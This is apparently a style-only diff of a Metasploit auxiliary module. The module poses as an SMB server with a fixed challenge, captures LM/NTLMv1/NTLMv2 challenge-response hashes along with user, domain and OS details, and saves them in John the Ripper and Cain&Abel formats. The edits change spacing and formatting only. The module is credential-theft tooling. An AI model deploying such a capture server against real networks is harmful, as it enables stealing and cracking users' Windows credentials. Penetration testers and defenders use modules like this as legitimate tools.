@@ -35,41 +35,54 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('CAINPWFILE',  [ false, "The local filename to store the hashes in Cain&Abel format", nil ]),
-        OptString.new('JOHNPWFILE',  [ false, "The prefix to the local filename to store the hashes in John format", nil ]),
-        OptString.new('CHALLENGE',   [ true, "The 8 byte server challenge", "1122334455667788" ])
-      ])
+        OptString.new('CAINPWFILE', [ false, "The local filename to store the hashes in Cain&Abel format", nil ]),
+        OptString.new('JOHNPWFILE', [ false, "The prefix to the local filename to store the hashes in John format", nil ]),
+        OptString.new('CHALLENGE', [ true, "The 8 byte server challenge", "1122334455667788" ])
+      ]
+    )
 
     register_advanced_options(
       [
-        OptBool.new("SMB_EXTENDED_SECURITY",
-          [ true,
+        OptBool.new(
+          "SMB_EXTENDED_SECURITY",
+          [
+            true,
             "Use smb extended security negotiation, when set client will use " \
             "ntlmssp, if not then client will use classic lanman " \
             "authentification",
             false
-          ]),
-        OptBool.new("NTLM_UseNTLM2_session",
-          [ true,
+          ]
+        ),
+        OptBool.new(
+          "NTLM_UseNTLM2_session",
+          [
+            true,
             "Activate the 'negotiate NTLM2 key' flag in NTLM authentication. " \
             "When SMB_EXTENDED_SECURITY negotiate is set, client will use " \
             "ntlm2_session instead of ntlmv1 (default on win 2K and above)",
             false
-          ]),
-        OptBool.new("USE_GSS_NEGOTIATION",
-          [ true,
+          ]
+        ),
+        OptBool.new(
+          "USE_GSS_NEGOTIATION",
+          [
+            true,
             "Send a gss_security blob in smb_negotiate response when SMB " \
             "extended security is set. When this flag is not set, Windows will " \
             "respond without gss encapsulation, Ubuntu will still use gss.",
             true
-          ]),
-        OptString.new('DOMAIN_NAME',
-          [ true,
+          ]
+        ),
+        OptString.new(
+          'DOMAIN_NAME',
+          [
+            true,
             "The domain name used during smb exchange with SMB_EXTENDED_SECURITY set.",
             "anonymous"
-          ])
-      ])
-
+          ]
+        )
+      ]
+    )
   end
 
   def run
@@ -87,8 +100,8 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # those variables will prevent to spam the screen with identical hashes (works only with ntlmv1)
-    @previous_lm_hash="none"
-    @previous_ntlm_hash="none"
+    @previous_lm_hash = "none"
+    @previous_ntlm_hash = "none"
     exploit
   end
 
@@ -96,7 +109,7 @@ class MetasploitModule < Msf::Auxiliary
     smb = @state[c]
     pkt = CONST::SMB_BASE_PKT.make_struct
     pkt.from_s(buff)
-    #Record the IDs
+    # Record the IDs
     smb[:process_id] = pkt['Payload']['SMB'].v['ProcessID']
     smb[:user_id] = pkt['Payload']['SMB'].v['UserID']
     smb[:tree_id] = pkt['Payload']['SMB'].v['TreeID']
@@ -118,7 +131,7 @@ class MetasploitModule < Msf::Auxiliary
       # This packet contains the lm/ntlm hashes
       if wordcount == 0x0D
         smb_cmd_session_setup(c, buff)
-        #CIFS SMB_COM_SESSION_SETUP_ANDX request with smb extended security
+        # CIFS SMB_COM_SESSION_SETUP_ANDX request with smb extended security
         # can be of type NTLMSS_NEGOCIATE or NTLMSSP_AUTH,
       elsif wordcount == 0x0C
         smb_cmd_session_setup_with_esn(c, buff)
@@ -138,21 +151,20 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-
   def smb_cmd_negotiate(c, buff, c_esn)
     smb = @state[c]
     pkt = CONST::SMB_NEG_PKT.make_struct
     pkt.from_s(buff)
 
-    group    = ''
-    machine  = smb[:nbsrc]
+    group = ''
+    machine = smb[:nbsrc]
 
     dialects = pkt['Payload'].v['Payload'].gsub(/\x00/, '').split(/\x02/).grep(/^\w+/)
     # print_status("Negotiation from #{smb[:name]}: #{dialects.join(", ")}")
 
     dialect =
       dialects.index("NT LM 0.12") ||
-      dialects.length-1
+      dialects.length - 1
 
     pkt = CONST::SMB_NEG_RES_NT_PKT.make_struct
     smb_set_defaults(c, pkt)
@@ -188,8 +200,8 @@ class MetasploitModule < Msf::Auxiliary
       pkt['Payload'].v['Capabilities'] = 0xe3fd
       pkt['Payload'].v['KeyLength'] = 8
       pkt['Payload'].v['Payload'] = @challenge +
-        Rex::Text.to_unicode(group) + "\x00\x00" +
-        Rex::Text.to_unicode(machine) + "\x00\x00"
+                                    Rex::Text.to_unicode(group) + "\x00\x00" +
+                                    Rex::Text.to_unicode(machine) + "\x00\x00"
     end
 
     c.put(pkt.to_s)
@@ -235,18 +247,17 @@ class MetasploitModule < Msf::Auxiliary
     names = buff.split("\x00\x00").map { |x| x.gsub(/\x00/, '') }
 
     smb[:username] = names[0]
-    smb[:domain]   = names[1]
-    smb[:peer_os]  = names[2]
-    smb[:peer_lm]  = names[3]
+    smb[:domain] = names[1]
+    smb[:peer_os] = names[2]
+    smb[:peer_lm] = names[3]
 
     begin
-      smb_get_hash(smb,arg,false)
+      smb_get_hash(smb, arg, false)
     rescue ::Exception => e
       print_error("SMB Capture - Error processing Hash from #{smb[:name]} : #{e.class} #{e} #{e.backtrace}")
     end
 
     smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
-
   end
 
   def smb_cmd_session_setup_with_esn(c, buff)
@@ -256,16 +267,16 @@ class MetasploitModule < Msf::Auxiliary
     pkt.from_s(buff)
 
     securityblobLen = pkt['Payload'].v['SecurityBlobLen']
-    blob = pkt['Payload'].v['Payload'][0,securityblobLen]
+    blob = pkt['Payload'].v['Payload'][0, securityblobLen]
 
     # detect if GSS is being used
-    if blob[0,7] == 'NTLMSSP'
+    if blob[0, 7] == 'NTLMSSP'
       c_gss = false
     else
       c_gss = true
       start = blob.index('NTLMSSP')
       if start
-        blob.slice!(0,start)
+        blob.slice!(0, start)
       else
         print_status("SMB Capture - Error finding NTLM in SMB_COM_SESSION_SETUP_ANDX request from #{smb[:name]} - #{smb[:ip]}, ignoring ...")
         smb_error(CONST::SMB_COM_SESSION_SETUP_ANDX, c, CONST::SMB_STATUS_LOGON_FAILURE, true)
@@ -296,7 +307,7 @@ class MetasploitModule < Msf::Auxiliary
       pkt['Payload']['SMB'].v['UserID'] = 2050
       pkt['Payload'].v['AndX'] = 0xFF
       pkt['Payload'].v['Reserved1'] = 0x00
-      pkt['Payload'].v['AndXOffset'] = 283 #ignored by client
+      pkt['Payload'].v['AndXOffset'] = 283 # ignored by client
       pkt['Payload'].v['Action'] = 0x0000
 
       win_domain = Rex::Text.to_unicode(@domain_name.upcase)
@@ -349,7 +360,7 @@ class MetasploitModule < Msf::Auxiliary
           :nt_hash => ntlm_message.ntlm_response.unpack('H*')[0]
         }
 
-        if @s_ntlm_esn && arg[:lm_hash][16,32] == '0' * 32
+        if @s_ntlm_esn && arg[:lm_hash][16, 32] == '0' * 32
           arg[:ntlm_ver] = NTLM_CONST::NTLM_2_SESSION_RESPONSE
         end
         # if the length of the ntlm response is not 24 then it will be
@@ -373,16 +384,16 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       buff = pkt['Payload'].v['Payload']
-      buff.slice!(0,securityblobLen)
+      buff.slice!(0, securityblobLen)
       names = buff.split("\x00\x00").map { |x| x.gsub(/\x00/, '') }
 
       smb[:username] = ntlm_message.user
-      smb[:domain]   = ntlm_message.domain
-      smb[:peer_os]  = names[0]
-      smb[:peer_lm]  = names[1]
+      smb[:domain] = ntlm_message.domain
+      smb[:peer_os] = names[0]
+      smb[:peer_lm] = names[1]
 
       begin
-        smb_get_hash(smb,arg,true)
+        smb_get_hash(smb, arg, true)
       rescue ::Exception => e
         print_error("SMB Capture - Error processing Hash from #{smb[:name]} - #{smb[:ip]} : #{e.class} #{e} #{e.backtrace}")
       end
@@ -392,9 +403,7 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-
-  def smb_get_hash(smb, arg = {}, esn=true)
-
+  def smb_get_hash(smb, arg = {}, esn = true)
     ntlm_ver = arg[:ntlm_ver]
 
     lm_hash = arg[:lm_hash]
@@ -486,7 +495,7 @@ class MetasploitModule < Msf::Auxiliary
         {
           :hash => [nt_hash].pack("H*"),
           :srv_challenge => @challenge,
-          :cli_challenge => [lm_hash].pack("H*")[0,8],
+          :cli_challenge => [lm_hash].pack("H*")[0, 8],
           :ntlm_ver => NTLM_CONST::NTLM_2_SESSION_RESPONSE,
           :type => 'ntlm'
         }
@@ -501,7 +510,7 @@ class MetasploitModule < Msf::Auxiliary
     # Display messages
     if esn
       smb[:username] = Rex::Text::to_ascii(smb[:username])
-      smb[:domain]   = Rex::Text::to_ascii(smb[:domain]) if smb[:domain]
+      smb[:domain] = Rex::Text::to_ascii(smb[:domain]) if smb[:domain]
     end
 
     capturedtime = Time.now.to_s
@@ -513,7 +522,7 @@ class MetasploitModule < Msf::Auxiliary
         "USER:#{smb[:username]} DOMAIN:#{smb[:domain]} OS:#{smb[:peer_os]} LM:#{smb[:peer_lm]}",
         "LMHASH:#{lm_hash_message ? lm_hash_message : "<NULL>"}",
         "NTHASH:#{nt_hash ? nt_hash : "<NULL>"}",
-        ].join("\n")
+      ].join("\n")
     when NTLM_CONST::NTLM_V2_RESPONSE
       capturelogmessage = [
         "SMB Captured - #{capturedtime}",
@@ -533,7 +542,7 @@ class MetasploitModule < Msf::Auxiliary
         "NTLM2_SESSION Response Captured from #{smb[:name]} - #{smb[:ip]}",
         "USER:#{smb[:username]} DOMAIN:#{smb[:domain]} OS:#{smb[:peer_os]} LM:#{smb[:peer_lm]}",
         "NTHASH:#{nt_hash ? nt_hash : "<NULL>"}",
-        "NT_CLIENT_CHALLENGE:#{lm_hash_message ? lm_hash_message[0,16] : "<NULL>"} ",
+        "NT_CLIENT_CHALLENGE:#{lm_hash_message ? lm_hash_message[0, 16] : "<NULL>"} ",
       ].join("\n")
     else # should not happen
       return
@@ -542,21 +551,21 @@ class MetasploitModule < Msf::Auxiliary
     print_status(capturelogmessage)
 
     report_note(
-      :host  => smb[:ip],
-      :type  => "smb_peer_os",
-      :data  => smb[:peer_os]
+      :host => smb[:ip],
+      :type => "smb_peer_os",
+      :data => smb[:peer_os]
     ) if (smb[:peer_os] and smb[:peer_os].strip.length > 0)
 
     report_note(
-      :host  => smb[:ip],
-      :type  => "smb_peer_lm",
-      :data  => smb[:peer_lm]
+      :host => smb[:ip],
+      :type => "smb_peer_lm",
+      :data => smb[:peer_lm]
     ) if (smb[:peer_lm] and smb[:peer_lm].strip.length > 0)
 
     report_note(
-      :host  => smb[:ip],
-      :type  => "smb_domain",
-      :data  => smb[:domain]
+      :host => smb[:ip],
+      :type => "smb_domain",
+      :data => smb[:domain]
     ) if (smb[:domain] and smb[:domain].strip.length > 0)
 
     return unless smb[:username]
@@ -578,15 +587,16 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     return if @previous_lm_hash == lm_hash and @previous_ntlm_hash == nt_hash
+
     @previous_lm_hash = lm_hash
     @previous_ntlm_hash = nt_hash
 
     creds = []
 
     case ntlm_ver
-    when NTLM_CONST::NTLM_V1_RESPONSE,NTLM_CONST::NTLM_2_SESSION_RESPONSE
+    when NTLM_CONST::NTLM_V1_RESPONSE, NTLM_CONST::NTLM_2_SESSION_RESPONSE
       jtr_hash = [
-        smb[:username],"",
+        smb[:username], "",
         smb[:domain] ? smb[:domain] : "NULL",
         lm_hash.empty? ? "0" * 48 : lm_hash,
         nt_hash.empty? ? "0" * 48 : nt_hash,
@@ -597,10 +607,10 @@ class MetasploitModule < Msf::Auxiliary
 
     when NTLM_CONST::NTLM_V2_RESPONSE
       # don't bother recording if LMv2 is disabled
-      unless lm_hash == '0'*32
+      unless lm_hash == '0' * 32
         # lmv2
         jtr_hash = [
-          smb[:username],"",
+          smb[:username], "",
           smb[:domain] ? smb[:domain] : "NULL",
           @challenge.unpack("H*")[0],
           lm_hash,
@@ -612,7 +622,7 @@ class MetasploitModule < Msf::Auxiliary
 
       # NTLMv2
       jtr_hash = [
-        smb[:username],"",
+        smb[:username], "",
         smb[:domain] ? smb[:domain] : "NULL",
         @challenge.unpack("H*")[0],
         nt_hash.empty? ? "0" * 32 : nt_hash,
@@ -640,11 +650,10 @@ class MetasploitModule < Msf::Auxiliary
         workspace_id: myworkspace_id,
       )
       if datastore['JOHNPWFILE']
-        File.open(datastore['JOHNPWFILE'] + '_' + cred[:jtr_format] , "ab") do |fd|
+        File.open(datastore['JOHNPWFILE'] + '_' + cred[:jtr_format], "ab") do |fd|
           fd.puts(cred[:private_data])
         end
       end
     end
-
   end
 end
